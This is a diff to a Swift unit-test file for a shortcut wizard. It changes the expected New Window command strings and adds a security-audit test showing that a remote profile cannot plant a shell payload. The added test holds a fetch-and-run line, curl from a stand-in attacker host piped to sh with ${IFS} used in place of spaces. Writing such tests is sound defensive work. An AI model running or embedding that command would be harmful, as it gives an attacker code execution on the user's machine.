@@ -210,17 +210,17 @@ final class WizardModelTests: XCTestCase {
     }
 
     func testProfileNewWindowCommandIsCopiedIntoTheShortcut() throws {
-        let profile = AppProfile(name: "Target", status: .verified, family: .native, args: [], env: [:], newWindowCommand: "open -na {target}", notes: nil)
+        let profile = AppProfile(name: "Target", status: .verified, family: .native, args: [], env: [:], newWindowCommand: "/usr/bin/open -na {target}", notes: nil)
         let model = WizardModel(prefillTarget: target, profileLookup: { $0 == "com.example.target" ? profile : nil })
-        XCTAssertEqual(model.newWindowCommand, "open -na {target}")
-        XCTAssertEqual(model.makeConfig().newWindowCommand, "open -na {target}")
+        XCTAssertEqual(model.newWindowCommand, "/usr/bin/open -na {target}")
+        XCTAssertEqual(model.makeConfig().newWindowCommand, "/usr/bin/open -na {target}")
 
         let plain = try writeFakeTarget(named: "Plain", bundleIdentifier: "com.example.plain", version: "1.0", in: dir)
         try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: plain.appending(path: "Contents/MacOS/Plain").path)
         model.selectTarget(plain)
         XCTAssertNil(model.newWindowCommand, "a target without a profile has no New Window command")
         model.selectTarget(target)
-        XCTAssertEqual(model.newWindowCommand, "open -na {target}")
+        XCTAssertEqual(model.newWindowCommand, "/usr/bin/open -na {target}")
         model.selectTarget(dir.appending(path: "Missing.app"))
         XCTAssertNil(model.newWindowCommand)
         XCTAssertNil(model.makeConfig().newWindowCommand)
@@ -230,6 +230,16 @@ final class WizardModelTests: XCTestCase {
         let profile = AppProfile(name: "Target", status: .verified, family: .native, args: [], env: [:], newWindowCommand: "open\n-na {target}", notes: nil)
         let model = WizardModel(prefillTarget: target, profileLookup: { $0 == "com.example.target" ? profile : nil })
         XCTAssertNil(model.newWindowCommand, "the editor would refuse to save a command with a line break")
+        XCTAssertNil(model.makeConfig().newWindowCommand)
+    }
+
+    func testDisallowedRemoteNewWindowCommandIsNotCopied() {
+        // Security audit C1: valid for the editor, but a remote profile may not plant a shell payload.
+        let payload = "/bin/sh -c curl${IFS}-fsSL${IFS}https://attacker.example/p|sh"
+        XCTAssertNil(NewWindowCommandBuilder.validationMessage(for: payload))
+        let profile = AppProfile(name: "Target", status: .verified, family: .native, args: [], env: [:], newWindowCommand: payload, notes: nil)
+        let model = WizardModel(prefillTarget: target, profileLookup: { $0 == "com.example.target" ? profile : nil })
+        XCTAssertNil(model.newWindowCommand)
         XCTAssertNil(model.makeConfig().newWindowCommand)
     }
 }
